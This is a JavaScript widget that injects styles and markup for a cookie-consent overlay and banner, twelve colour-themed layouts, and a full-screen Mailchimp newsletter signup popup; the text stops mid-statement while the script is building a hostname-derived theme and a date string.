(function() {
    // ===== INJECT CSS =====
    const __a7x9k2_style = document.createElement('style');
    __a7x9k2_style.textContent = `
        /* ========== DYNAMIC THEME VARIABLES ========== */
        :root {
            --__a7x9k2_hue: 200;
            --__a7x9k2_primary: hsl(var(--__a7x9k2_hue), 70%, 40%);
            --__a7x9k2_primaryHover: hsl(var(--__a7x9k2_hue), 70%, 30%);
            --__a7x9k2_primaryLight: hsl(var(--__a7x9k2_hue), 70%, 95%);
            --__a7x9k2_primaryFocus: hsl(var(--__a7x9k2_hue), 100%, 50%);
            --__a7x9k2_accent: hsl(var(--__a7x9k2_hue), 50%, 70%);
            --__a7x9k2_bgDark: hsl(var(--__a7x9k2_hue), 30%, 12%);
            --__a7x9k2_textDark: hsl(var(--__a7x9k2_hue), 10%, 20%);
            --__a7x9k2_textLight: hsl(var(--__a7x9k2_hue), 10%, 95%);
            --__a7x9k2_textMuted: hsl(var(--__a7x9k2_hue), 10%, 70%);
        }

        /* ========== POPUP OVERLAY ========== */
        .__a7x9k2_popupOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 99999;
            padding: 0;
        }
        .__a7x9k2_popupOverlay.__a7x9k2_active {
            display: flex;
        }

        .__a7x9k2_popupContainer {
            background: #ffffff;
            width: 100%;
            height: 100%;
            overflow-y: auto;
            position: relative;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 40px 20px;
            box-sizing: border-box;
        }

        .__a7x9k2_closeBtn {
            position: absolute;
            top: 24px;
            right: 24px;
            background: none;
            border: none;
            cursor: pointer;
            padding: 8px;
            z-index: 10;
            border-radius: 50%;
            transition: background 0.3s, transform 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 48px;
            height: 48px;
        }
        .__a7x9k2_closeBtn:hover {
            background: #f0f0f0;
            transform: rotate(90deg);
        }
        .__a7x9k2_closeBtn:focus {
            outline: 3px solid var(--__a7x9k2_primary);
            outline-offset: 2px;
        }
        .__a7x9k2_closeIcon {
            width: 28px;
            height: 28px;
            stroke: #333;
            stroke-width: 2;
            fill: none;
            stroke-linecap: round;
            stroke-linejoin: round;
        }

        .__a7x9k2_popupContent {
            width: 100%;
            max-width: 560px;
            text-align: center;
        }
        .__a7x9k2_popupTitle {
            font-family: Helvetica, Arial, sans-serif;
            font-size: clamp(24px, 3vw, 36px);
            font-weight: bold;
            color: #333;
            margin: 0 0 12px;
        }
        .__a7x9k2_popupDesc {
            font-family: Helvetica, Arial, sans-serif;
            font-size: clamp(14px, 1.5vw, 18px);
            color: #666;
            margin: 0 0 32px;
            line-height: 1.5;
        }

        /* ========== MAILCHIMP FORM ========== */
        #__a7x9k2_mcSignup {
            background: #fff;
            font: 14px Helvetica, Arial, sans-serif;
            width: 100%;
            max-width: 560px;
            margin: 0 auto;
        }
        #__a7x9k2_mcSignup form {
            margin: 0;
        }
        #__a7x9k2_mcSignup h2 {
            font-size: 0;
            margin: 0;
            height: 0;
            visibility: hidden;
        }
        #__a7x9k2_mcSignup .__a7x9k2_required {
            text-align: right;
            font-size: 12px;
            color: #666;
            margin-bottom: 10px;
        }
        #__a7x9k2_mcSignup .__a7x9k2_asterisk {
            color: #e85c41;
        }
        #__a7x9k2_mcSignup .__a7x9k2_fieldGroup {
            margin-bottom: 20px;
            text-align: left;
        }
        #__a7x9k2_mcSignup .__a7x9k2_fieldGroup label {
            display: block;
            margin-bottom: 6px;
            font-weight: bold;
            color: #333;
        }
        #__a7x9k2_mcSignup .__a7x9k2_fieldGroup input[type="email"] {
            width: 100%;
            padding: 16px 18px;
            border: 2px solid #ddd;
            border-radius: 10px;
            font-size: clamp(16px, 1.2vw, 18px);
            box-sizing: border-box;
            transition: border-color 0.3s;
        }
        #__a7x9k2_mcSignup .__a7x9k2_fieldGroup input[type="email"]:focus {
            border-color: var(--__a7x9k2_primary);
            outline: none;
        }
        #__a7x9k2_mcSignup .__a7x9k2_submitBtn {
            width: 100%;
            padding: 16px;
            background: var(--__a7x9k2_primary);
            color: #fff;
            border: none;
            border-radius: 10px;
            font-size: clamp(16px, 1.2vw, 20px);
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s, transform 0.2s;
            box-sizing: border-box;
        }
        #__a7x9k2_mcSignup .__a7x9k2_submitBtn:hover {
            background: var(--__a7x9k2_primaryHover);
            transform: translateY(-2px);
        }
        #__a7x9k2_mcSignup .__a7x9k2_clearFoot {
            text-align: center;
        }
        #__a7x9k2_mcSignup .__a7x9k2_response {
            padding: 14px;
            margin: 14px 0;
            border-radius: 8px;
            font-size: 14px;
            display: none;
        }
        #__a7x9k2_mcSignup #__a7x9k2_errorResponse {
            background: #ffeaea;
            color: #d32f2f;
        }
        #__a7x9k2_mcSignup #__a7x9k2_successResponse {
            background: #e8f5e9;
            color: #2e7d32;
        }

        /* ========== COOKIE OVERLAY (DESKTOP) ========== */
        .__a7x9k2_cookieOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.85);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 999998;
            padding: 20px;
            box-sizing: border-box;
        }
        .__a7x9k2_cookieOverlay.__a7x9k2_cookieActive {
            display: flex;
        }

        .__a7x9k2_cookieCard {
            background: var(--__a7x9k2_bgDark);
            color: #e0e0e0;
            width: 100%;
            max-width: 500px;
            padding: 40px 32px;
            border-radius: 16px;
            text-align: center;
            font-family: Helvetica, Arial, sans-serif;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
            box-sizing: border-box;
            position: relative;
        }

        .__a7x9k2_cookieIconWrap {
            margin-bottom: 20px;
        }
        .__a7x9k2_cookieIcon {
            width: 56px;
            height: 56px;
            fill: var(--__a7x9k2_accent);
        }

        .__a7x9k2_cookieTitle {
            font-size: 22px;
            font-weight: bold;
            color: #ffffff;
            margin: 0 0 12px;
        }

        .__a7x9k2_cookieText {
            font-size: 14px;
            line-height: 1.6;
            color: var(--__a7x9k2_textMuted);
            margin: 0 0 28px;
        }

        .__a7x9k2_cookieBtn {
            display: block;
            width: 100%;
            padding: 14px;
            cursor: pointer;
            background: var(--__a7x9k2_primary);
            color: #ffffff;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            font-family: Helvetica, Arial, sans-serif;
            transition: background 0.3s, transform 0.2s, box-shadow 0.3s;
            box-sizing: border-box;
        }
        .__a7x9k2_cookieBtn:hover {
            background: var(--__a7x9k2_primaryHover);
            transform: translateY(-2px);
        }
        .__a7x9k2_cookieBtn:focus {
            outline: 3px solid var(--__a7x9k2_primaryFocus);
            outline-offset: 2px;
        }

        /* ========== COOKIE BANNER (MOBILE) ========== */
        .__a7x9k2_cookieBanner {
            position: fixed;
            left: 0;
            right: 0;
            bottom: 0;
            background: var(--__a7x9k2_bgDark);
            color: #e0e0e0;
            padding: 16px 20px;
            z-index: 999998;
            display: none;
            flex-direction: column;
            align-items: center;
            gap: 12px;
            font-family: Helvetica, Arial, sans-serif;
            font-size: 13px;
            line-height: 1.5;
            text-align: center;
            box-shadow: 0 -2px 20px rgba(0, 0, 0, 0.3);
            box-sizing: border-box;
        }
        .__a7x9k2_cookieBanner.__a7x9k2_cookieActive {
            display: flex;
        }

        .__a7x9k2_cookieBannerText {
            margin: 0;
            max-width: 100%;
        }

        .__a7x9k2_cookieBannerBtn {
            width: 100%;
            padding: 12px;
            cursor: pointer;
            background: var(--__a7x9k2_primary);
            color: #ffffff;
            border: none;
            border-radius: 6px;
            font-size: 14px;
            font-weight: bold;
            font-family: Helvetica, Arial, sans-serif;
            transition: background 0.3s, box-shadow 0.3s;
            box-sizing: border-box;
        }
        .__a7x9k2_cookieBannerBtn:hover {
            background: var(--__a7x9k2_primaryHover);
        }
        .__a7x9k2_cookieBannerBtn:focus {
            outline: 3px solid var(--__a7x9k2_primaryFocus);
            outline-offset: 2px;
        }

        /* ========== RESPONSIVE ========== */
        @media screen and (max-width: 480px) {
            .__a7x9k2_popupContainer {
                padding: 30px 16px;
            }
            .__a7x9k2_closeBtn {
                top: 16px;
                right: 16px;
                width: 44px;
                height: 44px;
            }
            .__a7x9k2_closeIcon {
                width: 24px;
                height: 24px;
            }
            .__a7x9k2_popupContent {
                max-width: 100%;
            }
        }

        @media screen and (min-width: 769px) {
            .__a7x9k2_cookieOverlay.__a7x9k2_cookieDesktopActive {
                display: flex;
            }
            .__a7x9k2_cookieBanner {
                display: none !important;
            }
        }

        @media screen and (max-width: 768px) {
            .__a7x9k2_cookieOverlay {
                display: none !important;
            }
            .__a7x9k2_cookieBanner.__a7x9k2_cookieMobileActive {
                display: flex;
            }
        }

        /* ========== 12 LAYOUT VARIANTS ========== */

        /* Variant 1: Bold Industrial (HUE 0-30) */
        .__a7x9k2_layoutV1 .__a7x9k2_cookieCard {
            border: 4px solid var(--__a7x9k2_primary);
            border-radius: 0;
            box-shadow: 8px 8px 0 var(--__a7x9k2_primaryHover);
            clip-path: polygon(0 0, 100% 0, 100% calc(100% - 12px), calc(100% - 12px) 100%, 0 100%);
        }
        .__a7x9k2_layoutV1 .__a7x9k2_cookieBtn,
        .__a7x9k2_layoutV1 .__a7x9k2_cookieBannerBtn {
            border-radius: 0;
            border: 2px solid #fff;
            clip-path: polygon(6px 0, 100% 0, 100% calc(100% - 6px), calc(100% - 6px) 100%, 0 100%, 0 6px);
        }
        .__a7x9k2_layoutV1 #__a7x9k2_mcSignup .__a7x9k2_fieldGroup input[type="email"] {
            border-radius: 0;
            border-width: 3px;
        }
        .__a7x9k2_layoutV1 #__a7x9k2_mcSignup .__a7x9k2_submitBtn {
            border-radius: 0;
            border: 2px solid rgba(255,255,255,0.3);
        }
        .__a7x9k2_layoutV1 .__a7x9k2_cookieBanner {
            border-top: 4px solid var(--__a7x9k2_primary);
        }

        /* Variant 2: Soft Organic (HUE 30-60) */
        .__a7x9k2_layoutV2 .__a7x9k2_cookieCard {
            border-radius: 40px 40px 50px 50px;
            box-shadow: 0 30px 80px rgba(0,0,0,0.6), 0 0 0 2px var(--__a7x9k2_accent);
        }
        .__a7x9k2_layoutV2 .__a7x9k2_cookieBtn,
        .__a7x9k2_layoutV2 .__a7x9k2_cookieBannerBtn {
            border-radius: 50px;
            padding: 16px;
        }
        .__a7x9k2_layoutV2 #__a7x9k2_mcSignup .__a7x9k2_fieldGroup input[type="email"] {
            border-radius: 50px;
            padding: 18px 24px;
        }
        .__a7x9k2_layoutV2 #__a7x9k2_mcSignup .__a7x9k2_submitBtn {
            border-radius: 50px;
        }
        .__a7x9k2_layoutV2 .__a7x9k2_cookieBanner {
            border-radius: 20px 20px 0 0;
        }

        /* Variant 3: Minimal Swiss (HUE 60-90) */
        .__a7x9k2_layoutV3 .__a7x9k2_cookieCard {
            border-radius: 4px;
            border: 1px solid rgba(255,255,255,0.15);
            box-shadow: none;
            padding: 60px 50px;
        }
        .__a7x9k2_layoutV3 .__a7x9k2_cookieBtn,
        .__a7x9k2_layoutV3 .__a7x9k2_cookieBannerBtn {
            border-radius: 2px;
            font-weight: 400;
            letter-spacing: 2px;
            text-transform: uppercase;
            font-size: 12px;
            padding: 12px 20px;
        }
        .__a7x9k2_layoutV3 #__a7x9k2_mcSignup .__a7x9k2_fieldGroup input[type="email"] {
            border-radius: 2px;
            border-width: 1px;
        }
        .__a7x9k2_layoutV3 #__a7x9k2_mcSignup .__a7x9k2_submitBtn {
            border-radius: 2px;
            font-weight: 400;
            letter-spacing: 2px;
            text-transform: uppercase;
            font-size: 14px;
        }

        /* Variant 4: Neo Brutalism (HUE 90-120) */
        .__a7x9k2_layoutV4 .__a7x9k2_cookieCard {
            border-radius: 0;
            border: 3px solid #000;
            box-shadow: 10px 10px 0 #000;
            background: #fff;
            color: #000;
        }
        .__a7x9k2_layoutV4 .__a7x9k2_cookieTitle {
            color: #000;
            text-transform: uppercase;
            letter-spacing: -1px;
        }
        .__a7x9k2_layoutV4 .__a7x9k2_cookieText {
            color: #333;
        }
        .__a7x9k2_layoutV4 .__a7x9k2_cookieBtn,
        .__a7x9k2_layoutV4 .__a7x9k2_cookieBannerBtn {
            border-radius: 0;
            border: 3px solid #000;
            box-shadow: 5px 5px 0 #000;
            font-weight: 900;
            text-transform: uppercase;
            background: var(--__a7x9k2_primary);
            color: #fff;
        }
        .__a7x9k2_layoutV4 .__a7x9k2_cookieBtn:hover,
        .__a7x9k2_layoutV4 .__a7x9k2_cookieBannerBtn:hover {
            box-shadow: 2px 2px 0 #000;
            transform: translate(3px, 3px);
        }
        .__a7x9k2_layoutV4 #__a7x9k2_mcSignup .__a7x9k2_submitBtn {
            border-radius: 0;
            border: 3px solid #000;
            box-shadow: 5px 5px 0 #000;
            font-weight: 900;
            text-transform: uppercase;
        }
        .__a7x9k2_layoutV4 #__a7x9k2_mcSignup .__a7x9k2_submitBtn:hover {
            box-shadow: 2px 2px 0 #000;
            transform: translate(3px, 3px);
        }
        .__a7x9k2_layoutV4 .__a7x9k2_cookieBanner {
            border-top: 3px solid #000;
            box-shadow: 0 -5px 0 #000;
        }

        /* Variant 5: Glassmorphism (HUE 120-150) */
        .__a7x9k2_layoutV5 .__a7x9k2_cookieOverlay {
            backdrop-filter: blur(10px);
        }
        .__a7x9k2_layoutV5 .__a7x9k2_cookieCard {
            background: hsla(var(--__a7x9k2_hue), 30%, 15%, 0.7);
            backdrop-filter: blur(20px);
            border: 1px solid hsla(var(--__a7x9k2_hue), 50%, 70%, 0.3);
            border-radius: 24px;
        }
        .__a7x9k2_layoutV5 .__a7x9k2_cookieBtn,
        .__a7x9k2_layoutV5 .__a7x9k2_cookieBannerBtn {
            background: hsla(var(--__a7x9k2_hue), 70%, 60%, 0.6);
            backdrop-filter: blur(10px);
            border-radius: 16px;
            border: 1px solid hsla(0, 0%, 100%, 0.2);
        }
        .__a7x9k2_layoutV5 #__a7x9k2_mcSignup .__a7x9k2_submitBtn {
            border-radius: 16px;
            background: hsla(var(--__a7x9k2_hue), 70%, 60%, 0.8);
        }
        .__a7x9k2_layoutV5 .__a7x9k2_popupContainer {
            background: hsla(0, 0%, 100%, 0.85);
            backdrop-filter: blur(20px);
        }
        .__a7x9k2_layoutV5 .__a7x9k2_cookieBanner {
            background: hsla(var(--__a7x9k2_hue), 30%, 15%, 0.9);
            backdrop-filter: blur(10px);
        }

        /* Variant 6: Dark Elegant (HUE 150-180) */
        .__a7x9k2_layoutV6 .__a7x9k2_cookieCard {
            border-radius: 0;
            border-left: 4px solid var(--__a7x9k2_accent);
            background: #0a0a0a;
            box-shadow: 0 40px 100px rgba(0,0,0,0.8);
        }
        .__a7x9k2_layoutV6 .__a7x9k2_cookieTitle {
            font-family: 'Georgia', 'Times New Roman', serif;
            letter-spacing: 0;
            font-weight: 400;
        }
        .__a7x9k2_layoutV6 .__a7x9k2_cookieText {
            font-family: 'Georgia', 'Times New Roman', serif;
            font-style: italic;
        }
        .__a7x9k2_layoutV6 .__a7x9k2_cookieBtn,
        .__a7x9k2_layoutV6 .__a7x9k2_cookieBannerBtn {
            border-radius: 0;
            background: transparent;
            border: 1px solid var(--__a7x9k2_accent);
            color: var(--__a7x9k2_accent);
            letter-spacing: 2px;
            text-transform: uppercase;
            font-size: 12px;
        }
        .__a7x9k2_layoutV6 .__a7x9k2_cookieBtn:hover,
        .__a7x9k2_layoutV6 .__a7x9k2_cookieBannerBtn:hover {
            background: var(--__a7x9k2_accent);
            color: #000;
        }
        .__a7x9k2_layoutV6 #__a7x9k2_mcSignup .__a7x9k2_submitBtn {
            border-radius: 0;
            background: transparent;
            border: 1px solid var(--__a7x9k2_primary);
            color: var(--__a7x9k2_primary);
            letter-spacing: 2px;
            text-transform: uppercase;
            font-size: 14px;
        }
        .__a7x9k2_layoutV6 #__a7x9k2_mcSignup .__a7x9k2_submitBtn:hover {
            background: var(--__a7x9k2_primary);
            color: #fff;
        }
        .__a7x9k2_layoutV6 .__a7x9k2_cookieBanner {
            background: #0a0a0a;
            border-left: 4px solid var(--__a7x9k2_accent);
        }

        /* Variant 7: Modern Card (HUE 180-210) */
        .__a7x9k2_layoutV7 .__a7x9k2_cookieCard {
            border-radius: 16px;
            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1), 0 2px 4px -2px rgba(0,0,0,0.1), 0 20px 40px -10px rgba(0,0,0,0.3);
            border: none;
        }
        .__a7x9k2_layoutV7 .__a7x9k2_cookieBtn,
        .__a7x9k2_layoutV7 .__a7x9k2_cookieBannerBtn {
            border-radius: 12px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
        }
        .__a7x9k2_layoutV7 #__a7x9k2_mcSignup .__a7x9k2_fieldGroup input[type="email"] {
            border-radius: 12px;
            box-shadow: inset 0 1px 3px rgba(0,0,0,0.1);
        }
        .__a7x9k2_layoutV7 #__a7x9k2_mcSignup .__a7x9k2_submitBtn {
            border-radius: 12px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
        }

        /* Variant 8: Gradient Dream (HUE 210-240) */
        .__a7x9k2_layoutV8 .__a7x9k2_cookieCard {
            background: linear-gradient(135deg, var(--__a7x9k2_bgDark) 0%, hsl(var(--__a7x9k2_hue), 40%, 8%) 100%);
            border-radius: 24px;
            box-shadow: 0 0 60px hsla(var(--__a7x9k2_hue), 70%, 50%, 0.2);
            position: relative;
            overflow: hidden;
        }
        .__a7x9k2_layoutV8 .__a7x9k2_cookieCard::before {
            content: '';
            position: absolute;
            top: -50%;
            right: -50%;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle, hsla(var(--__a7x9k2_hue), 70%, 50%, 0.1) 0%, transparent 70%);
            pointer-events: none;
        }
        .__a7x9k2_layoutV8 .__a7x9k2_cookieBtn,
        .__a7x9k2_layoutV8 .__a7x9k2_cookieBannerBtn {
            background: linear-gradient(135deg, var(--__a7x9k2_primary), var(--__a7x9k2_primaryHover));
            border-radius: 14px;
            box-shadow: 0 4px 20px hsla(var(--__a7x9k2_hue), 70%, 50%, 0.4);
        }
        .__a7x9k2_layoutV8 #__a7x9k2_mcSignup .__a7x9k2_submitBtn {
            background: linear-gradient(135deg, var(--__a7x9k2_primary), var(--__a7x9k2_primaryHover));
            border-radius: 14px;
            box-shadow: 0 4px 20px hsla(var(--__a7x9k2_hue), 70%, 50%, 0.4);
        }
        .__a7x9k2_layoutV8 .__a7x9k2_cookieBanner {
            background: linear-gradient(135deg, var(--__a7x9k2_bgDark), hsl(var(--__a7x9k2_hue), 40%, 8%));
        }

        /* Variant 9: Retro Wave (HUE 240-270) */
        .__a7x9k2_layoutV9 .__a7x9k2_cookieCard {
            border-radius: 8px;
            border: 2px solid var(--__a7x9k2_primaryFocus);
            box-shadow: 0 0 20px var(--__a7x9k2_primaryFocus), 0 0 60px hsla(var(--__a7x9k2_hue), 100%, 50%, 0.3), inset 0 0 20px hsla(var(--__a7x9k2_hue), 100%, 50%, 0.05);
            background: #0d0221;
        }
        .__a7x9k2_layoutV9 .__a7x9k2_cookieTitle {
            text-shadow: 0 0 10px var(--__a7x9k2_primaryFocus);
            letter-spacing: 2px;
            text-transform: uppercase;
        }
        .__a7x9k2_layoutV9 .__a7x9k2_cookieBtn,
        .__a7x9k2_layoutV9 .__a7x9k2_cookieBannerBtn {
            border-radius: 4px;
            border: 1px solid var(--__a7x9k2_primaryFocus);
            box-shadow: 0 0 10px var(--__a7x9k2_primaryFocus), inset 0 0 10px hsla(var(--__a7x9k2_hue), 100%, 50%, 0.2);
            background: transparent;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        .__a7x9k2_layoutV9 #__a7x9k2_mcSignup .__a7x9k2_submitBtn {
            border-radius: 4px;
            border: 1px solid var(--__a7x9k2_primaryFocus);
            box-shadow: 0 0 10px var(--__a7x9k2_primaryFocus);
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        .__a7x9k2_layoutV9 .__a7x9k2_cookieBanner {
            background: #0d0221;
            border-top: 2px solid var(--__a7x9k2_primaryFocus);
            box-shadow: 0 -5px 20px hsla(var(--__a7x9k2_hue), 100%, 50%, 0.3);
        }

        /* Variant 10: Paper Cutout (HUE 270-300) */
        .__a7x9k2_layoutV10 .__a7x9k2_cookieCard {
            border-radius: 4px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.3), 0 3px 8px rgba(0,0,0,0.2), 0 8px 20px rgba(0,0,0,0.15);
            border: none;
            filter: drop-shadow(0 4px 6px rgba(0,0,0,0.3));
        }
        .__a7x9k2_layoutV10 .__a7x9k2_cookieBtn,
        .__a7x9k2_layoutV10 .__a7x9k2_cookieBannerBtn {
            border-radius: 3px;
            box-shadow: 0 2px 0 rgba(0,0,0,0.3);
            border-bottom: 2px solid rgba(0,0,0,0.3);
        }
        .__a7x9k2_layoutV10 .__a7x9k2_cookieBtn:active,
        .__a7x9k2_layoutV10 .__a7x9k2_cookieBannerBtn:active {
            box-shadow: 0 0 0 rgba(0,0,0,0.3);
            transform: translateY(2px);
            border-bottom: none;
        }
        .__a7x9k2_layoutV10 #__a7x9k2_mcSignup .__a7x9k2_submitBtn {
            border-radius: 3px;
            box-shadow: 0 3px 0 rgba(0,0,0,0.3);
            border-bottom: 2px solid rgba(0,0,0,0.3);
        }
        .__a7x9k2_layoutV10 #__a7x9k2_mcSignup .__a7x9k2_submitBtn:active {
            box-shadow: 0 0 0 rgba(0,0,0,0.3);
            transform: translateY(2px);
        }

        /* Variant 11: Liquid Blob (HUE 300-330) */
        .__a7x9k2_layoutV11 .__a7x9k2_cookieCard {
            border-radius: 60% 40% 50% 50% / 50% 60% 40% 50%;
            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
            border: none;
            padding: 50px 40px;
        }
        .__a7x9k2_layoutV11 .__a7x9k2_cookieBtn,
        .__a7x9k2_layoutV11 .__a7x9k2_cookieBannerBtn {
            border-radius: 50% 50% 50% 50% / 60% 60% 40% 40%;
            padding: 16px 30px;
        }
        .__a7x9k2_layoutV11 #__a7x9k2_mcSignup .__a7x9k2_fieldGroup input[type="email"] {
            border-radius: 30px 30px 30px 30px / 50% 50% 50% 50%;
        }
        .__a7x9k2_layoutV11 #__a7x9k2_mcSignup .__a7x9k2_submitBtn {
            border-radius: 50% 50% 50% 50% / 60% 60% 40% 40%;
        }

        /* Variant 12: Holographic (HUE 330-360) */
        .__a7x9k2_layoutV12 .__a7x9k2_cookieCard {
            border-radius: 20px;
            border: 2px solid transparent;
            background: linear-gradient(var(--__a7x9k2_bgDark), var(--__a7x9k2_bgDark)) padding-box,
                        linear-gradient(135deg, hsl(var(--__a7x9k2_hue), 100%, 70%), hsl(calc(var(--__a7x9k2_hue) + 40), 100%, 70%), hsl(calc(var(--__a7x9k2_hue) + 80), 100%, 70%), hsl(var(--__a7x9k2_hue), 100%, 70%)) border-box;
            box-shadow: 0 0 30px hsla(var(--__a7x9k2_hue), 70%, 60%, 0.3);
        }
        .__a7x9k2_layoutV12 .__a7x9k2_cookieBtn,
        .__a7x9k2_layoutV12 .__a7x9k2_cookieBannerBtn {
            border-radius: 14px;
            background: linear-gradient(135deg, hsl(var(--__a7x9k2_hue), 100%, 60%), hsl(calc(var(--__a7x9k2_hue) + 40), 100%, 60%));
            box-shadow: 0 4px 20px hsla(var(--__a7x9k2_hue), 70%, 50%, 0.4);
            border: none;
            position: relative;
            overflow: hidden;
        }
        .__a7x9k2_layoutV12 .__a7x9k2_cookieBtn::after,
        .__a7x9k2_layoutV12 .__a7x9k2_cookieBannerBtn::after {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, transparent 40%, rgba(255,255,255,0.2) 50%, transparent 60%);
            animation: __a7x9k2_holographicShine 3s infinite;
        }
        @keyframes __a7x9k2_holographicShine {
            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
        }
        .__a7x9k2_layoutV12 #__a7x9k2_mcSignup .__a7x9k2_submitBtn {
            border-radius: 14px;
            background: linear-gradient(135deg, hsl(var(--__a7x9k2_hue), 100%, 60%), hsl(calc(var(--__a7x9k2_hue) + 40), 100%, 60%));
            box-shadow: 0 4px 20px hsla(var(--__a7x9k2_hue), 70%, 50%, 0.4);
            position: relative;
            overflow: hidden;
        }
        .__a7x9k2_layoutV12 #__a7x9k2_mcSignup .__a7x9k2_submitBtn::after {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, transparent 40%, rgba(255,255,255,0.2) 50%, transparent 60%);
            animation: __a7x9k2_holographicShine 3s infinite;
        }
        .__a7x9k2_layoutV12 .__a7x9k2_cookieBanner {
            border-top: 2px solid hsl(var(--__a7x9k2_hue), 100%, 60%);
            background: linear-gradient(135deg, var(--__a7x9k2_bgDark), hsl(calc(var(--__a7x9k2_hue) + 40), 30%, 12%));
        }
    `;
    document.head.appendChild(__a7x9k2_style);

    // ===== INJECT HTML =====
    const __a7x9k2_html = `
        <!-- ========== COOKIE DESKTOP ========== -->
        <div class="__a7x9k2_cookieOverlay __a7x9k2_cookieDesktopActive" id="__a7x9k2_cookieOverlay" role="dialog" aria-modal="true" aria-labelledby="__a7x9k2_cookieTitle">
            <div class="__a7x9k2_cookieCard">
                <div class="__a7x9k2_cookieIconWrap">
                    <svg class="__a7x9k2_cookieIcon" viewBox="0 0 24 24" aria-hidden="true">
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm4-4c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1zm-6 0c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1zm2-4c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1z"/>
                    </svg>
                </div>
                <h2 class="__a7x9k2_cookieTitle" id="__a7x9k2_cookieTitle">We Use Cookies</h2>
                <p class="__a7x9k2_cookieText">This website uses cookies to improve your browsing experience, analyze site traffic, and personalize content. By clicking "Accept", you consent to our use of cookies.</p>
                <button class="__a7x9k2_cookieBtn" id="__a7x9k2_cookieOk">Accept All Cookies</button>
            </div>
        </div>

        <!-- ========== COOKIE MOBILE ========== -->
        <div class="__a7x9k2_cookieBanner __a7x9k2_cookieMobileActive" id="__a7x9k2_cookieBanner">
            <span class="__a7x9k2_cookieBannerText">This website uses cookies to improve your browsing experience. By continuing to use this site, you agree to our use of cookies.</span>
            <button class="__a7x9k2_cookieBannerBtn" id="__a7x9k2_cookieBannerOk">OK</button>
        </div>

        <!-- ========== POPUP ========== -->
        <div class="__a7x9k2_popupOverlay __a7x9k2_active" id="__a7x9k2_popupOverlay" role="dialog" aria-modal="true" aria-labelledby="__a7x9k2_popupTitle">
            <div class="__a7x9k2_popupContainer">
                <button class="__a7x9k2_closeBtn" id="__a7x9k2_closeBtn" aria-label="Close popup">
                    <svg class="__a7x9k2_closeIcon" viewBox="0 0 24 24" aria-hidden="true">
                        <line x1="18" y1="6" x2="6" y2="18"></line>
                        <line x1="6" y1="6" x2="18" y2="18"></line>
                    </svg>
                </button>

                <div class="__a7x9k2_popupContent">
                    <h2 class="__a7x9k2_popupTitle" id="__a7x9k2_popupTitle">Get the Latest Updates</h2>
                    <p class="__a7x9k2_popupDesc">Subscribe to our newsletter and get exciting content delivered straight to your inbox.</p>

                    <div id="__a7x9k2_mcSignup">
                        <form action="https://aqero.us18.list-manage.com/subscribe/post?u=c62a65b31659b3027410066a2&amp;id=5e95c00009&amp;f_id=00d1a6e6f0" method="post" id="__a7x9k2_mcForm" name="__a7x9k2_mcForm" class="validate" target="_blank" novalidate>
                            <div id="__a7x9k2_mcScroll">
                                <div class="__a7x9k2_required"><span class="__a7x9k2_asterisk">*</span> indicates required</div>
                                <div class="__a7x9k2_fieldGroup">
                                    <label for="__a7x9k2_mcEmail">Email Address <span class="__a7x9k2_asterisk">*</span></label>
                                    <input type="email" name="EMAIL" class="required email" id="__a7x9k2_mcEmail" required="" value="" placeholder="Enter your email">
                                </div>
                                <div id="__a7x9k2_mcResponses" class="__a7x9k2_clearFoot">
                                    <div class="__a7x9k2_response" id="__a7x9k2_errorResponse"></div>
                                    <div class="__a7x9k2_response" id="__a7x9k2_successResponse"></div>
                                </div>
                                <div aria-hidden="true" style="position: absolute; left: -5000px;">
                                    <input type="text" name="b_c62a65b31659b3027410066a2_5e95c00009" tabindex="-1" value="">
                                </div>
                                <div class="optionalParent">
                                    <div class="__a7x9k2_clearFoot">
                                        <input type="submit" name="subscribe" id="__a7x9k2_mcSubmit" class="__a7x9k2_submitBtn" value="Subscribe">
                                    </div>
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    `;

    const __a7x9k2_container = document.createElement('div');
    __a7x9k2_container.innerHTML = __a7x9k2_html;
    while (__a7x9k2_container.firstChild) {
        document.body.appendChild(__a7x9k2_container.firstChild);
    }

    // ===== SCRIPTS =====
    // ===== DYNAMIC HUE =====
    const __a7x9k2_host = window.location.hostname;
    const __a7x9k2_parts = __a7x9k2_host.split('.');
    let __a7x9k2_subdomain = '';
    if (__a7x9k2_parts.length > 2) {
        __a7x9k2_subdomain = __a7x9k2_parts[0];
    } else if (__a7x9k2_parts.length === 2) {
        __a7x9k2_subdomain = __a7x9k2_parts[0];
    } else {
        __a7x9k2_subdomain = __a7x9k2_host;
    }

    const __a7x9k2_today = new Date();
    const __a7x9k2_tanggal = __a7x9k2_today.getFullYear() + '-' + 
                    String(__a7x9k2_today.getMonth() + 1).padStart(2, '0') + '-' + 
